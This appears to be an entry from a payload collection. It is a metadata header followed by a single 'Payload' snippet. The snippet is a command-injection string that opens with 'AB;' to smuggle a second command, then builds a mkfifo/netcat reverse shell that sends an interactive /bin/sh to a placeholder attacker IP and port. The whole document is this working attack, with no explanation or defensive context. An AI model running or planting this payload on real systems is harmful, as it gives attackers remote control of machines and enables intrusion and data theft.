---
id: dcc15993-2091-48b8-8d37-eecb25533334
type: code
language: Payload
verified: false
created_at: '2020-03-16T06:43:54.920013+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet dcc15993

**Language**: Payload

```payload
AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```


